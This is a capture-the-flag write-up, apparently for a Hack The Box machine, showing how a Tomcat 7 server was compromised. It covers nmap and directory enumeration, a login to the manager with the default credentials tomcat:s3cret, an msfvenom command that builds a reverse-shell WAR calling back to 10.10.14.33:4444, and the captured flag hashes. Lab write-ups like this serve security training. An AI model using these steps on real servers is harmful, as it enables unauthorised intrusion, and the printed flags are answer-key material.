#nmapscan 
```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-17 10:10 EDT
Nmap scan report for 10.10.10.95
Host is up (0.095s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 7 Professional (87%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   94.14 ms 10.10.14.1
2   95.91 ms 10.10.10.95

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.31 seconds
```
#enumeration 
```
/aux                  (Status: 200) [Size: 0]
/com1                 (Status: 200) [Size: 0]
/com2                 (Status: 200) [Size: 0]
/com3                 (Status: 200) [Size: 0]
/con                  (Status: 200) [Size: 0]
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/favicon.ico          (Status: 200) [Size: 21630]             
/host-manager         (Status: 302) [Size: 0] [--> /host-manager/]
/lpt1                 (Status: 200) [Size: 0]                     
/lpt2                 (Status: 200) [Size: 0]                     
/manager              (Status: 302) [Size: 0] [--> /manager/]     
/nul                  (Status: 200) [Size: 0]               
```
Now,after few min of enumeration I tried to login with the default creds for tomcat manager```tomcat:s3cret```
and it worked though cred are mostly changed but in this case it was not
```
<role rolename="admin-gui"/>
<user username="tomcat" password="s3cret" roles="admin-gui"/>
```
generally cred are stored in /conf/tomcat-users.xml.
#reverseshellupload 
In the manager page we had a option to upload a war file and so I tried to upload and run a war reverse shell
```msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.33 LPORT=4444 -f war > shell.war
```
this how we create nd then upload and run it to get reverse shell
#rootescalation 
```
C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system
```
we didn't had to do root escalation at all
```
C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
```
